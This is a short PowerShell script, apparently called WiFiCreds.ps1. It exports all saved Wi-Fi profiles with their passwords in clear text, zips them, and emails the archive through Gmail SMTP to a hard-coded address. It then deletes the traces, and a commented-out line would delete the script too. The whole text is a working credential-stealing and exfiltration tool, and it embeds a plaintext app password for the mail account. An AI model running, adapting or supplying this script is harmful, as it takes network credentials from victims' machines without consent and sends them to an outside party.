mkdir .creds
netsh wlan export profile folder= .creds key=clear
Compress-Archive -Path ~\.creds -DestinationPath  ~\creds.Zip
rm -r .creds

$From = "KiddyTheScript@gmail.com"
$To = "KiddyTheScript@gmail.com"
$Attachment = ~\creds.Zip
$Subject = "creds"
$Body = "Meow Meow"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
$secpasswd = ConvertTo-SecureString "rhznsrbplaffeeao" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("KiddyTheScript@gmail.com", $secpasswd)
Send-MailMessage -SmtpServer smtp.gmail.com -port 587 -Credential $cred -UseSsl -From $from -To $To -Subject $Subject -Attachments ~\creds.Zip -Body $Body

Remove-Item -Force creds.Zip

#Remove-Item WiFiCreds.ps1 -Force 
